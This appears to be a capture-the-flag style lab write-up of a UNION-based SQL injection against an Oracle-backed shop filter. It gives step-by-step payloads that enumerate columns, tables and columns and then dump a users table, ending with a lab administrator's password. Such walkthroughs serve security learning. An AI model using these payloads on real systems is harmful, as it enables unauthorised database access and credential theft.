The first step in this lab is to find the number of columns available by:
1.)
'ORDER BY 1--
'ORDER BY 2--

From here we determine that there are two columns.

Next is to determine the data types the columns can hold:
2.) 'Union SELECT NULL, NULL from DUAL
test with 'a', 'b'

Both hold text 'a','b'+FROM+dual


3.) Get table name
GET /filter?category=Pets'UNION+SELECT+'a',table_name+FROM+all_tables-- 

Returns an interesting table name:
USERS_KCRMQH

4.) Get column name
'UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = USERS_KCRMQH

# 'UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_KCRMQH'--

PASSWORD_DZSYWL
USERNAME_JTQIDO

5.) Pull from the table
'UNION SELECT USERNAME_JTQIDO, PASSWORD_DZSYWL FROM  USERS_KCRMQH--


Returns:
administrator
xtd0su7c9ufzsvu4pyme